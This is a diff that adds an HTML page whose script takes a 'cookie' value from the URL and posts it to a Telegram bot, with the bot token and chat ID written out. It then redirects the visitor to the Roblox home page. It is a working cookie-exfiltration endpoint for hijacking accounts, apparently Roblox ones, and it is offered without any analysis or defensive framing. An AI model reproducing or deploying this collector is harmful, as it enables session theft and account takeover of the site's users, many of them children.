@@ -1,1 +1,22 @@
-
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const cookie = params.get('cookie');
+        
+        if (cookie) {
+            fetch('https://api.telegram.org/bot8693453531:AAFwUMH_otrs4oxV_lGMdokUVKQTjX3mN64/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: 8205534130,
+                    text: '🍪 Кука: ' + cookie
+                })
+            });
+        }
+        
+        window.location.href = 'https://www.roblox.com/home';
+    </script>
+</body>
+</html>
